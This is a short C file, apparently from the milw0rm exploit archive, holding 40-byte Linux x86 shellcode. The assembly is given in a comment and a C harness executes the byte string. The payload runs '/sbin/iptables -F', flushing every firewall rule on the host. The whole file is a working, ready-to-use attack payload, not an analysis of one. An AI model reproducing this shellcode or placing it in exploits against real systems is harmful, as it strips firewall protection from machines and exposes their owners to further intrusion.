/* By Kris Katterjohn 11/18/2006
 *
 * 40 byte shellcode to flush iptables for Linux x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; execve("/sbin/iptables", { "/sbin/iptables", "-F", NULL }, NULL)
 *
 *      push byte 11
 *      pop eax
 *      cdq
 *      push edx
 *      push word 0x462d
 *      mov ecx, esp
 *      push edx
 *      push word 0x7365
 *      push 0x6c626174
 *      push 0x70692f6e
 *      push 0x6962732f
 *      mov ebx, esp
 *      push edx
 *      push ecx
 *      push ebx
 *      mov ecx, esp
 *      int 0x80
 */

main()
{
       char shellcode[] =
               "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x46\x89"
               "\xe1\x52\x66\x68\x65\x73\x68\x74\x61\x62"
               "\x6c\x68\x6e\x2f\x69\x70\x68\x2f\x73\x62"
               "\x69\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80";

       (*(void (*)()) shellcode)();
}

// milw0rm.com [2007-03-09]